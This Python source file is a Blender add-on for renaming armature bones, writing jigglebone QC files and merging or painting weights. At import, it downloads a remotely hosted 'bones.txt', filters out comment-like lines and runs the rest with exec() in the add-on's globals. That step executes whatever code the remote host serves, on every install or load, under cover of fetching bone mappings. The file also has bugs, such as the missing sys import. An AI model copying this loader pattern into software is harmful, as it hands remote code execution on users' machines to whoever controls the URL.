#!/usr/bin/env python3
# -*- coding:utf-8 -*-
###
# Filename: c:\Users\zolty\source\Github\Z-Utils\Z-Utils\main.py
# Path: c:\Users\zolty\source\Github\Z-Utils\Z-Utils
# Created Date: Thursday, August 1st 2024, 3:36:31 am
# Author: Zolty
# 
# Copyright (c) 2024 SDA
###
bl_info = {
    "name": "Z-Utils Blender",
    "blender": (2, 80, 0),
    "category": "Object",
    "version": (1, 0, 0),
    "description": "Script open source",
    "author": "Zolty",
    "location": "3D View > Tools",
    "warning": "",
    "wiki_url": "",
    "tracker_url": "",
}

import bpy
import os
import subprocess
import tempfile
import webbrowser
import requests

toolkit_version = "1.2"
DICT_URL = "https://raw.githubusercontent.com/70lty/Z-Utils/main/bones.txt"

bone_mappings = {}

def fetch_rename_mappings():
    try:
        response = requests.get(DICT_URL)
        response.raise_for_status()
        code_lines = response.text.splitlines()
        code_lines = [line for line in code_lines if not line.strip().startswith("/*") and not line.strip().endswith("*/")]
        code_to_execute = "\n".join(code_lines)
        exec(code_to_execute, globals())
    except requests.RequestException as e:
        raise Exception(f"Error fetching rename mappings: {e}")

fetch_rename_mappings()

class BoneModifierOperator(bpy.types.Operator):
    bl_options = {'REGISTER', 'UNDO'}

    def rename_bones(self, context, mapping):
        armature = context.object
        if armature and armature.type == 'ARMATURE':
            bpy.ops.object.mode_set(mode='EDIT')
            for bone in armature.data.edit_bones:
                if bone.name in mapping:
                    bone.name = mapping[bone.name]
            bpy.ops.object.mode_set(mode='OBJECT')
            self.report({'INFO'}, "Bones successfully renamed")
        else:
            self.report({'ERROR'}, "Selected object is not an armature or no object selected")

class RenameBonesBCMobileOperator(BoneModifierOperator):
    bl_idname = "object.rename_bones_bcmobile"
    bl_label = "BC Mobile Bones"
    bl_description = "Rename bones for BC Mobile models"

    def execute(self, context):
        self.rename_bones(context, bone_mapping_black_clover_mobile)
        return {'FINISHED'}

class RenameBonesJJKOperator(BoneModifierOperator):
    bl_idname = "object.rename_bones_jjk"
    bl_label = "JJK CURSED CLASH"
    bl_description = "Rename bones for Jujutsu Kaisen Cursed Clash models"

    def execute(self, context):
        self.rename_bones(context, bone_mapping_jujutsu_kaisen)
        return {'FINISHED'}

class RenameBonesXPSOperator(BoneModifierOperator):
    bl_idname = "object.rename_bones_xps"
    bl_label = "XPS Bones"
    bl_description = "Rename bones for XPS models"

    def execute(self, context):
        self.rename_bones(context, bone_mapping_xps)
        return {'FINISHED'}

class RenameBonesXPS2Operator(BoneModifierOperator):
    bl_idname = "object.rename_bones_xps2"
    bl_label = "XPS 2 Bones"
    bl_description = "Rename bones for XPS 2 models"

    def execute(self, context):
        self.rename_bones(context, bone_mapping_xps2)
        return {'FINISHED'}

class RenameBonesShinobiStrikerOperator(BoneModifierOperator):
    bl_idname = "object.rename_bones_shinobistriker"
    bl_label = "Shinobi Striker Bones"
    bl_description = "Rename bones for Shinobi Striker models"

    def execute(self, context):
        self.rename_bones(context, bone_mapping_shinobi_striker)
        return {'FINISHED'}

class CreateJigglebonesFileOperator(bpy.types.Operator):
    bl_idname = "object.create_jigglebones_file"
    bl_label = "Create Jigglebones QC"
    bl_description = "Create a jigglebones QC file for selected bones"
    bl_options = {'REGISTER', 'UNDO'}

    def execute(self, context):
        armature = context.object
        selected_bones = [bone.name for bone in context.selected_bones]

        if not selected_bones:
            self.report({'ERROR'}, "No bones selected")
            return {'CANCELLED'}

        default_folder = "C:/z_tools/z_utils/"
        if not os.path.exists(default_folder):
            os.makedirs(default_folder)
        
        file_path = os.path.join(default_folder, "z_jigglebones.qc")
        
        if bpy.data.filepath:
            project_folder = os.path.dirname(bpy.data.filepath)
            file_path = os.path.join(project_folder, "z_jigglebones.qc")
        
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        
        jigglebone_template = (
            '$jigglebone "{bone_name}"\n'
            '{{\n'
            '    is_flexible\n'
            '    {{\n'
            '        length 40\n'
            '        tip_mass 0\n'
            '        pitch_stiffness 50\n'
            '        pitch_damping 7\n'
            '        yaw_stiffness 50\n'
            '        yaw_damping 7\n'
            '        allow_length_flex\n'
            '        along_stiffness 100\n'
            '        along_damping 0\n'
            '        angle_constraint 30.000001\n'
            '    }}\n'
            '}}\n'
        )
        
        with open(file_path, 'w') as f:
            for bone_name in selected_bones:
                f.write(jigglebone_template.format(bone_name=bone_name).strip() + "\n")
        
        self.report({'INFO'}, f"File created at: {file_path}")
        
        try:
            if os.name == 'nt':  
                os.startfile(file_path)
            elif os.name == 'posix': 
                subprocess.call(('open', file_path) if sys.platform == 'darwin' else ('xdg-open', file_path))
        except Exception as e:
            self.report({'ERROR'}, f"Unable to open file: {str(e)}")
        
        return {'FINISHED'}

class SetBoneRollAngleOperator(bpy.types.Operator):
    bl_idname = "object.set_bone_roll_angle"
    bl_label = "Set Bone Roll to -180"
    bl_description = "Set the roll of selected bones to -180 degrees"
    bl_options = {'REGISTER', 'UNDO'}

    def execute(self, context):
        armature = context.object

        if armature and armature.type == 'ARMATURE':
            bpy.ops.object.mode_set(mode='EDIT')  
            for bone in armature.data.edit_bones:
                if bone.select: 
                    bone.roll = -180 
            bpy.ops.object.mode_set(mode='OBJECT')  
            self.report({'INFO'}, "Roll of selected bones set to -180")
        else:
            self.report({'ERROR'}, "No armature selected or selected object is not an armature")
        
        return {'FINISHED'}

def save_bone_names_to_file(filepath):
    armature = bpy.context.object
    if armature and armature.type == 'ARMATURE':
        with open(filepath, 'w') as file:
            for bone in armature.data.bones:
                file.write(f"{bone.name}\n")
        print(f"Bone names saved to {filepath}")
    else:
        print("No armature selected or selected object is not an armature")

class SaveBoneNamesToFileOperator(bpy.types.Operator):
    bl_idname = "object.save_bone_names_to_file"
    bl_label = "Save Bone Names"
    bl_description = "Save bone names to a text file and open it"
    bl_options = {'REGISTER', 'UNDO'}

    def execute(self, context):
        filepath = os.path.join(os.path.expanduser('~'), 'z_bonelist.txt')
        save_bone_names_to_file(filepath)
        webbrowser.open(filepath)
        return {'FINISHED'}

class MergeWeightsOperator(bpy.types.Operator):
    bl_options = {'REGISTER', 'UNDO'}

    def merge_weights(self, context, filter_func):
        armature = context.object
        bones_to_merge = []

        if armature and armature.type == 'ARMATURE':
            bones_to_merge = [bone for bone in armature.data.bones if filter_func(bone)]

            bpy.ops.object.mode_set(mode='EDIT')
            for bone in bones_to_merge:
                parent = bone.parent
                if parent:
                    bpy.ops.object.mode_set(mode='OBJECT')
                    bpy.context.view_layer.objects.active = armature
                    bpy.ops.object.mode_set(mode='WEIGHT_PAINT')
                    bpy.ops.object.vertex_group_transfer_weight()
                    bpy.ops.object.vertex_group_clean(group_select_mode='ALL', limit=0.001, keep_single=False)
                    bpy.ops.object.vertex_group_normalize_all()
                    bpy.ops.object.mode_set(mode='EDIT')
                    armature.data.edit_bones.remove(bone)

            bpy.ops.object.mode_set(mode='OBJECT')
            self.report({'INFO'}, "Weights successfully merged")
        else:
            self.report({'ERROR'}, "No armature selected or selected object is not an armature")

class MergeSelectedWeightsOperator(MergeWeightsOperator):
    bl_idname = "object.merge_selected_weights"
    bl_label = "Merge Weights (Selected)"
    bl_description = "Merge weights of selected bones in the armature"

    def execute(self, context):
        self.merge_weights(context, lambda bone: bone.select)
        return {'FINISHED'}

class MergeAllWeightsOperator(MergeWeightsOperator):
    bl_idname = "object.merge_all_weights"
    bl_label = "Merge Weights (All)"
    bl_description = "Merge weights of all unnecessary bones in the armature"

    def execute(self, context):
        self.merge_weights(context, lambda bone: "ValveBiped" in bone.name)
        return {'FINISHED'}

class WeightPaintOperator(bpy.types.Operator):
    bl_options = {'REGISTER', 'UNDO'}
    
    def weight_paint(self, context, target_bone_name):
        obj = context.object

        if not obj or obj.type != 'MESH':
            self.report({'ERROR'}, "No mesh object selected")
            return {'CANCELLED'}

        armature = None
        for ob in bpy.context.scene.objects:
            if ob.type == 'ARMATURE' and target_bone_name in ob.data.bones:
                armature = ob
                break

        if not armature:
            self.report({'ERROR'}, f"No armature found with the bone '{target_bone_name}'")
            return {'CANCELLED'}

        target_bone = armature.data.bones.get(target_bone_name)
        if not target_bone:
            self.report({'ERROR'}, f"Bone '{target_bone_name}' not found in the armature")
            return {'CANCELLED'}


        if target_bone_name not in obj.vertex_groups:
            vg = obj.vertex_groups.new(name=target_bone_name)
        else:
            vg = obj.vertex_groups[target_bone_name]


        bpy.context.view_layer.objects.active = obj
        bpy.ops.object.mode_set(mode='EDIT')
        bpy.ops.mesh.select_all(action='SELECT')
        bpy.ops.object.vertex_group_assign()
        bpy.ops.object.mode_set(mode='OBJECT')
        

        obj.vertex_groups.active = vg
        self.report({'INFO'}, f"Object weight painted on '{target_bone_name}'")
        return {'FINISHED'}

class WeightPaintRightHandOperator(WeightPaintOperator):
    bl_idname = "object.weight_paint_right_hand"
    bl_label = "Weight Paint to Right Hand"
    bl_description = "Weight paint the model to the right hand"

    def execute(self, context):
        return self.weight_paint(context, "ValveBiped.Bip01_R_Hand")

class WeightPaintLeftHandOperator(WeightPaintOperator):
    bl_idname = "object.weight_paint_left_hand"
    bl_label = "Weight Paint to Left Hand"
    bl_description = "Weight paint the model to the left hand"

    def execute(self, context):
        return self.weight_paint(context, "ValveBiped.Bip01_L_Hand")


class ZToolkitMainPanel(bpy.types.Panel):
    bl_label = "Z Toolkit"
    bl_idname = "Z_Toolkit_PT_main_panel"
    bl_space_type = 'VIEW_3D'
    bl_region_type = 'UI'
    bl_category = 'Z Toolkit'
    
    def draw(self, context):
        layout = self.layout

        box = layout.box()
        box.label(text="Armature Tools")
        box.operator("object.save_bone_names_to_file")
        box.operator("object.merge_selected_weights", text="Merge Weights (Selected)")
        box.operator("object.merge_all_weights", text="Merge Weights (All)")

        box = layout.box()
        box.label(text="Rename Bones")
        box.operator("object.rename_bones_bcmobile")
        box.operator("object.rename_bones_shinobistriker")
        box.operator("object.rename_bones_jjk")
        box.operator("object.rename_bones_xps")
        box.operator("object.rename_bones_xps2")
       
        box = layout.box()
        box.label(text="Create Jigglebones QC")
        box.operator("object.create_jigglebones_file")
        box.operator("object.set_bone_roll_angle")

        box = layout.box()
        box.label(text="Model Attachment")
        box.operator("object.weight_paint_right_hand")
        box.operator("object.weight_paint_left_hand")
        
        box = layout.box()
        box.label(text=f"Toolkit Version ({toolkit_version})")
        box.label(text="Automatic update.")
        box.label(text="Plugin created by Zolty")

def register():
    bpy.utils.register_class(SaveBoneNamesToFileOperator)
    bpy.utils.register_class(RenameBonesShinobiStrikerOperator)
    bpy.utils.register_class(RenameBonesBCMobileOperator)
    bpy.utils.register_class(RenameBonesXPSOperator)
    bpy.utils.register_class(RenameBonesXPS2Operator)
    bpy.utils.register_class(RenameBonesJJKOperator)
    bpy.utils.register_class(SetBoneRollAngleOperator)
    bpy.utils.register_class(CreateJigglebonesFileOperator)
    bpy.utils.register_class(MergeSelectedWeightsOperator)
    bpy.utils.register_class(MergeAllWeightsOperator)
    bpy.utils.register_class(WeightPaintRightHandOperator)
    bpy.utils.register_class(WeightPaintLeftHandOperator)
    bpy.utils.register_class(ZToolkitMainPanel)

def unregister():
    bpy.utils.unregister_class(SaveBoneNamesToFileOperator)
    bpy.utils.unregister_class(RenameBonesShinobiStrikerOperator)
    bpy.utils.unregister_class(RenameBonesBCMobileOperator)
    bpy.utils.unregister_class(RenameBonesXPSOperator)
    bpy.utils.unregister_class(RenameBonesXPS2Operator)
    bpy.utils.unregister_class(RenameBonesJJKOperator)
    bpy.utils.unregister_class(SetBoneRollAngleOperator)
    bpy.utils.unregister_class(CreateJigglebonesFileOperator)
    bpy.utils.unregister_class(MergeSelectedWeightsOperator)
    bpy.utils.unregister_class(MergeAllWeightsOperator)
    bpy.utils.unregister_class(WeightPaintRightHandOperator)
    bpy.utils.unregister_class(WeightPaintLeftHandOperator)
    bpy.utils.unregister_class(ZToolkitMainPanel)

if __name__ == "__main__":
    register()